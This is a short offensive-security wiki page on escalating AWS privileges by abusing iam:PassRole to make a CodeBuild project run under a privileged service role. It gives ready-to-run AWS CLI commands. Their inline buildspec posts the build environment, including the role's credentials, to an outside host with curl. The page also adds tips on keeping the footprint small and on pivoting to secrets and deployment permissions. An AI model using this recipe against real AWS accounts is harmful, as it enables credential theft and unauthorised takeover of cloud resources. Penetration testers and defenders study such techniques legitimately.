---
title: "CodeBuild: PassRole into a build project service role"
description: "iam:PassRole into a CodeBuild project to run buildspec commands under a privileged service role."
keywords:
  - PassRole
  - CodeBuild
  - buildspec
  - service role
  - build
---

# CodeBuild

A CodeBuild project runs a `buildspec` under a **service role**. With `iam:PassRole` and `codebuild:CreateProject` plus `StartBuild`, you pass a privileged role and supply a buildspec whose commands run with that role's credentials, exposed to the build environment through the standard credential provider chain.

## Create and run a project

```bash
aws codebuild create-project --name x \
  --service-role arn:aws:iam::<acct>:role/<privileged-role> \
  --artifacts '{"type":"NO_ARTIFACTS"}' \
  --environment '{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:7.0","computeType":"BUILD_GENERAL1_SMALL"}' \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - aws sts get-caller-identity\n      - curl -X POST -d \"$(env)\" https://you.example"}'
aws codebuild start-build --project-name x
```

The build runs your commands as the service role; dump its credentials from the environment and continue.

## Exploitation notes

- An inline `NO_SOURCE` buildspec avoids staging a repo, keeping the footprint to two API calls.
- CodeBuild service roles frequently hold deploy-time permissions (ECR push, S3 write, Secrets Manager), so the role is often a strong pivot.

## Tools

- **AWS CLI** (`codebuild create-project` / `start-build`).
- **Pacu**: CodeBuild privesc module.

## References

- [Rhino Security Labs: AWS privilege escalation (CodeBuild)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [HackTricks Cloud: AWS CodeBuild privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-codebuild-enum.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
